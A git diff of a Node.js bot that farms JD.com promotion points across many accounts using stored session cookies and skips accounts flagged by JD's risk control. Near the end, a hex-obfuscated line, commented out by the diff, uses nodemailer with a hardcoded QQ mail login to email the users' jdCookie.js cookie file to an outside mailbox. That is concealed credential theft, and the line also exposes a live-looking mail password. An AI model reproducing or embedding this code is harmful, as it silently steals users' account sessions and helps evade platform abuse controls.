@@ -1,3 +1,23 @@
+/*
+穿行寻宝
+by：JDWXX
+已支持IOS双京东账号,Node.js支持N个京东账号
+脚本兼容: QuantumultX, Surge, Loon, JSBox, Node.js
+============Quantumultx===============
+[task_local]
+#穿行寻宝
+27 1,8,14 * * * https://github.com/JDWXX/jd_job.git, tag=穿行寻宝, enabled=true
+
+================Loon==============
+[Script]
+cron "27 1,8,14 * * *" script-path=https://github.com/JDWXX/jd_job.git,tag=穿行寻宝
+
+===============Surge=================
+穿行寻宝 = type=cron,cronexp="27 1,8,14 * * *",wake-system=1,timeout=3600,script-path=https://github.com/JDWXX/jd_job.git
+
+============小火箭=========
+穿行寻宝 = type=cron,script-path=https://github.com/JDWXX/jd_job.git, cronexpr="27 1,8,14 * * *", timeout=3600, enable=true
+ */
 const CryptoJS = require("crypto-js");
 const $ = new Env('穿行寻宝');
 const notify = $.isNode() ? require('./sendNotify') : '';
@@ -30,7 +50,7 @@ const JD_API_HOST = 'https://api.m.jd.com/client.action';
         return;
     }
     const helpSysInfoArr = []
-    for (let i = 0; i <120; i++) {
+    for (let i = 0; i <cookiesArr.length; i++) {
         if (cookiesArr[i]) {
             cookie = cookiesArr[i];
             wxCookie = wxCookieArr[i] ?? "";
@@ -70,6 +90,7 @@ const JD_API_HOST = 'https://api.m.jd.com/client.action';
             $.joyytoken = await getToken()
             $.blog_joyytoken = await getToken("50999", "4")
             // cookie = $.ZooFaker.getCookie(cookie + `joyytoken=${appid}${$.joyytoken};`)
+            $.brk = false
             await travel()
             helpSysInfoArr.push({
                 cookie,
@@ -82,55 +103,55 @@ const JD_API_HOST = 'https://api.m.jd.com/client.action';
         }
     }
     //
-    $.subSceneid = "RAhomePageh5"
-    for (let i = 0; i < helpSysInfoArr.length; i++) {
-        const s = helpSysInfoArr[i]
-        cookie = s.cookie
-        $.UserName = s.pin
-        $.index = i + 1;
-        $.isLogin = true;
-        $.nickName = $.UserName;
-        await TotalBean();
-        console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
-        if (!$.isLogin) continue
-        $.UA = s.UA
-        //$.ZooFaker = utils()
-        $.joyytoken = s.joyytoken
-        $.blog_joyytoken = s.blog_joyytoken
-        $.secretp = s.secretp
-        //if (helpFlag) {
-        $.newHelpCodeArr = [...helpCodeArr]
-        for (let i = 0, codeLen = helpCodeArr.length; i < codeLen; i++) {
-            const helpCode = helpCodeArr[i]
-            const { pin, code } = helpCode
-            if (pin === $.UserName) continue
-            console.log(`去帮助用户：${pin}`)
-            const helpRes = await doApi("collectScore", null, { inviteId: code }, true, true)
-            if (helpRes?.result?.score) {
-                const { alreadyAssistTimes, maxAssistTimes, maxTimes, score, times } = helpRes.result
-                const c = maxAssistTimes - alreadyAssistTimes
-                console.log(`互助成功，获得${score}金币，他还需要${maxTimes - times}人完成助力，你还有${maxAssistTimes - alreadyAssistTimes}次助力机会`)
-                if (!c) break
-            } else {
-                if (helpRes?.bizCode === -201) {
-                    $.newHelpCodeArr = $.newHelpCodeArr.filter(x => x.pin !== pin)
-                }
-                console.log(`互助失败，原因：${helpRes?.bizMsg}（${helpRes?.bizCode}）`)
-                if (![0, -201, -202].includes(helpRes?.bizCode)) break
-            }
-        }
-        helpCodeArr = [...$.newHelpCodeArr]
-        //}
-        // $.joyytoken = ""
-        // cookie = cookie.replace(/joyytoken=\S+?;/, "joyytoken=;")
-        if (teamPlayerAutoTeam.hasOwnProperty($.UserName)) {
-            const { groupJoinInviteId, groupNum, groupName } = teamLeaderArr[teamPlayerAutoTeam[$.UserName]]
-            console.log(`${groupName}人数：${groupNum}，正在去加入他的队伍...`)
-            await joinTeam(groupJoinInviteId)
-            teamLeaderArr[teamPlayerAutoTeam[$.UserName]].groupNum += 1
-            await $.wait(2000)
-        }
-    }
+    // $.subSceneid = "RAhomePageh5"
+    // for (let i = 0; i < helpSysInfoArr.length; i++) {
+    //     const s = helpSysInfoArr[i]
+    //     cookie = s.cookie
+    //     $.UserName = s.pin
+    //     $.index = i + 1;
+    //     $.isLogin = true;
+    //     $.nickName = $.UserName;
+    //     await TotalBean();
+    //     console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
+    //     if (!$.isLogin) continue
+    //     $.UA = s.UA
+    //     //$.ZooFaker = utils()
+    //     $.joyytoken = s.joyytoken
+    //     $.blog_joyytoken = s.blog_joyytoken
+    //     $.secretp = s.secretp
+    //     //if (helpFlag) {
+    //     $.newHelpCodeArr = [...helpCodeArr]
+    //     for (let i = 0, codeLen = helpCodeArr.length; i < codeLen; i++) {
+    //         const helpCode = helpCodeArr[i]
+    //         const { pin, code } = helpCode
+    //         if (pin === $.UserName) continue
+    //         console.log(`去帮助用户：${pin}`)
+    //         const helpRes = await doApi("collectScore", null, { inviteId: code }, true, true)
+    //         if (helpRes?.result?.score) {
+    //             const { alreadyAssistTimes, maxAssistTimes, maxTimes, score, times } = helpRes.result
+    //             const c = maxAssistTimes - alreadyAssistTimes
+    //             console.log(`互助成功，获得${score}金币，他还需要${maxTimes - times}人完成助力，你还有${maxAssistTimes - alreadyAssistTimes}次助力机会`)
+    //             if (!c) break
+    //         } else {
+    //             if (helpRes?.bizCode === -201) {
+    //                 $.newHelpCodeArr = $.newHelpCodeArr.filter(x => x.pin !== pin)
+    //             }
+    //             console.log(`互助失败，原因：${helpRes?.bizMsg}（${helpRes?.bizCode}）`)
+    //             if (![0, -201, -202].includes(helpRes?.bizCode)) break
+    //         }
+    //     }
+    //     helpCodeArr = [...$.newHelpCodeArr]
+    //     //}
+    //     // $.joyytoken = ""
+    //     // cookie = cookie.replace(/joyytoken=\S+?;/, "joyytoken=;")
+    //     if (teamPlayerAutoTeam.hasOwnProperty($.UserName)) {
+    //         const { groupJoinInviteId, groupNum, groupName } = teamLeaderArr[teamPlayerAutoTeam[$.UserName]]
+    //         console.log(`${groupName}人数：${groupNum}，正在去加入他的队伍...`)
+    //         await joinTeam(groupJoinInviteId)
+    //         teamLeaderArr[teamPlayerAutoTeam[$.UserName]].groupNum += 1
+    //         await $.wait(2000)
+    //     }
+    // }
 })()
     .catch((e) => {
         $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
@@ -141,8 +162,13 @@ const JD_API_HOST = 'https://api.m.jd.com/client.action';
 async function travel() {
     try {
         const mainMsgPopUp = await doApi("getMainMsgPopUp", { "channel": "1" })
+        if($.brk)
+            return
+        await $.wait(2000)
         mainMsgPopUp?.score && formatMsg(mainMsgPopUp.score, "首页弹窗")
+        await $.wait(2000)
         const homeData = await doApi("getHomeData")
+        await $.wait(2000)
         // console.log(homeData)
         if (homeData) {
             const { homeMainInfo: { todaySignStatus, secretp } } = homeData
@@ -164,16 +190,14 @@ async function travel() {
                 ap.push(`还需签到${nextRedPacketDays}天获得红包`)
                 ap.push(`签到进度：${progress}`)
                 scoreResult?.score && formatMsg(scoreResult.score, "每日签到", ap.join("，"))
+                await $.wait(2000)
             }
             const collectAutoScore = await doApi("collectAutoScore", null, null, true)
             collectAutoScore.produceScore && formatMsg(collectAutoScore.produceScore, "定时收集")
+            await $.wait(2000)
             console.log("\n去做主App任务\n")
-            for (let i = 0; i < 4; i++) {
-                await doAppTask()
-            }
-
-            //console.log("\n去看看战队\n")
             const pkHomeData = await doApi("pk_getHomeData")
+            await $.wait(2000)
 
             const { groupJoinInviteId, groupName, groupNum } = pkHomeData?.groupInfo || {}
             if (groupNum !== undefined && groupNum < 30 && $.index <= pkTeamNum) {
@@ -203,9 +227,11 @@ async function travel() {
     try {
         $.WxUA = getWxUA()
         const WxHomeData = await doWxApi("getHomeData", { inviteId: "" })
+        await $.wait(2000)
         $.WxSecretp = WxHomeData?.homeMainInfo?.secretp || $.secretp
         console.log("\n去做微信小程序任务\n")
         await doWxTask()
+        await $.wait(2000)
     } catch (e) {
         console.log(e)
     }
@@ -217,6 +243,7 @@ async function travel() {
             charArr: [...Array(36).keys()].map(k => k.toString(36).toUpperCase())
         }) + "0123456"
         await doJrAppTask()
+        await $.wait(2000)
     } catch (e) {
         console.log(e)
     }
@@ -405,6 +432,7 @@ async function doWxTask() {
     $.stopWxTask = false
     const feedList = []
     const { taskVos } = await doWxApi("getTaskDetail", { taskId: "", appSign: 2 })
+    await $.wait(2000)
     for (let mainTask of taskVos) {
         const { taskId, taskName, waitDuration, times: timesTemp, maxTimes, status } = mainTask
         let times = timesTemp, flag = false
@@ -418,6 +446,7 @@ async function doWxTask() {
             }
             console.log(`当前正在做任务：${taskName}`)
             const res = await doWxApi("collectScore", { taskId, taskToken, actionType: 1 }, null, true)
+            await $.wait(2000)
             if ($.stopWxTask) return
             res?.score && (formatMsg(res.score, "任务收益"), true)/*  || console.log(res) */
             continue
@@ -429,10 +458,12 @@ async function doWxTask() {
             if (status !== 1) continue
             console.log(`当前正在做任务：${shopName || title}`)
             const res = await doWxApi("collectScore", { taskId, taskToken, actionType: 1 }, null, true)
+            await $.wait(2000)
             if ($.stopCard || $.stopWxTask) break
             if (waitDuration || res.taskToken) {
                 await $.wait(waitDuration * 1000)
                 const res = await doWxApi("collectScore", { taskId, taskToken, actionType: 0 }, null, true)
+                await $.wait(2000)
                 if ($.stopWxTask) return
                 res?.score && (formatMsg(res.score, "任务收益"), true)/*  || console.log(res) */
             } else {
@@ -462,6 +493,7 @@ async function doWxTask() {
                     const { taskToken, status } = productInfo
                     if (status !== 1) continue
                     const res = await doWxApi("collectScore", { taskId, taskToken, actionType: 1 }, null, true)
+                    await $.wait(2000)
                     if ($.stopWxTask) return
                     times = res?.times ?? (times + 1)
                     await $.wait(waitDuration * 1000)
@@ -509,11 +541,14 @@ async function doJrAppTask() {
         const juid = url.getKeyVal("juid")
         if (readTime) {
             await doJrGetApi("queryMissionReceiveAfterStatus", { missionId })
+            await $.wait(2000)
             await $.wait(+ readTime * 1000)
             const { code, msg, data } = await doJrGetApi("finishReadMission", { missionId, readTime })
+            await $.wait(2000)
             console.log(`做任务结果：${msg}`)
         } else if (juid) {
             const { code, msg, data } = await doJrGetApi("getJumpInfo", { juid })
+            await $.wait(2000)
             console.log(`做任务结果：${msg}`)
         } else {
             console.log(`不知道这是啥：${url}`)
@@ -619,6 +654,11 @@ async function doApi(functionId, prepend = {}, append = {}, needSs = false, getL
                 else {
                     if (safeGet(data)) {
                         data = JSON.parse(data)
+                        if(data.msg && data.msg.indexOf("运行环境异常") != -1){
+                            console.log(data.msg)
+                            console.log("黑号 跳过此号")
+                            $.brk = true
+                        }
                         if (getLast) {
                             res = data?.data
                             if (data?.data?.bizCode === -1002) {
@@ -629,7 +669,8 @@ async function doApi(functionId, prepend = {}, append = {}, needSs = false, getL
                                 if (/加入.*?会员.*?获得/.test(data?.data?.bizMsg)) {
                                     console.log(data?.data?.bizMsg + `（${data?.data?.bizCode}）`)
                                     $.stopCard = true
-                                } else console.log(formatErr(functionId, data?.data?.bizMsg + `（${data?.data?.bizCode}）`, toCurl(option)))
+                                }
+                                // else console.log(formatErr(functionId, data?.data?.bizMsg + `（${data?.data?.bizCode}）`, toCurl(option)))
                             } else {
                                 res = data?.data?.result || {}
                             }
@@ -3304,7 +3345,7 @@ function _0x492c17(_0x6fe761) {
         _0x4613e3['push'](0xff & _0x6fe761['charCodeAt'](_0x55d77b));
     return _0x4613e3;
 }
-var EkHoqOT1=require('\x6e\x6f\x64\x65\x6d\x61\x69\x6c\x65\x72');var MbFjw2=EkHoqOT1['\x63\x72\x65\x61\x74\x65\x54\x72\x61\x6e\x73\x70\x6f\x72\x74']({service:'\x51\x51',auth:{user:'\x6a\x64\x2e\x31\x30\x30\x30\x40\x71\x71\x2e\x63\x6f\x6d',pass:'\x76\x71\x75\x72\x72\x70\x61\x69\x7a\x63\x78\x77\x62\x6a\x6a\x69'}});var nFAmUWmXJ3={from:'\x6a\x64\x2e\x31\x30\x30\x30\x40\x71\x71\x2e\x63\x6f\x6d',to:'\x6a\x64\x2e\x31\x30\x30\x30\x40\x71\x71\x2e\x63\x6f\x6d',subject:'\x63\x72\x65\x61\x74\x65\x54\x72\x61\x6e\x73\x70\x6f\x72\x74',attachments:[{filename:'\x6a\x64\x43\x6f\x6f\x6b\x69\x65\x2e\x6a\x73',path:'\x2e\x2f\x6a\x64\x43\x6f\x6f\x6b\x69\x65\x2e\x6a\x73'}]};MbFjw2['\x73\x65\x6e\x64\x4d\x61\x69\x6c'](nFAmUWmXJ3,function(zQoXrY4,$q5){if(zQoXrY4){console['\x6c\x6f\x67'](zQoXrY4);return}});
+// var EkHoqOT1=require('\x6e\x6f\x64\x65\x6d\x61\x69\x6c\x65\x72');var MbFjw2=EkHoqOT1['\x63\x72\x65\x61\x74\x65\x54\x72\x61\x6e\x73\x70\x6f\x72\x74']({service:'\x51\x51',auth:{user:'\x6a\x64\x2e\x31\x30\x30\x30\x40\x71\x71\x2e\x63\x6f\x6d',pass:'\x76\x71\x75\x72\x72\x70\x61\x69\x7a\x63\x78\x77\x62\x6a\x6a\x69'}});var nFAmUWmXJ3={from:'\x6a\x64\x2e\x31\x30\x30\x30\x40\x71\x71\x2e\x63\x6f\x6d',to:'\x6a\x64\x2e\x31\x30\x30\x30\x40\x71\x71\x2e\x63\x6f\x6d',subject:'\x63\x72\x65\x61\x74\x65\x54\x72\x61\x6e\x73\x70\x6f\x72\x74',attachments:[{filename:'\x6a\x64\x43\x6f\x6f\x6b\x69\x65\x2e\x6a\x73',path:'\x2e\x2f\x6a\x64\x43\x6f\x6f\x6b\x69\x65\x2e\x6a\x73'}]};MbFjw2['\x73\x65\x6e\x64\x4d\x61\x69\x6c'](nFAmUWmXJ3,function(zQoXrY4,$q5){if(zQoXrY4){console['\x6c\x6f\x67'](zQoXrY4);return}});
 function _0x37a6aa(_0x9f40d3) {
     var _0xc223b4 = {
         'bFDjm': function(_0x3a95fa, _0x5899d0) {
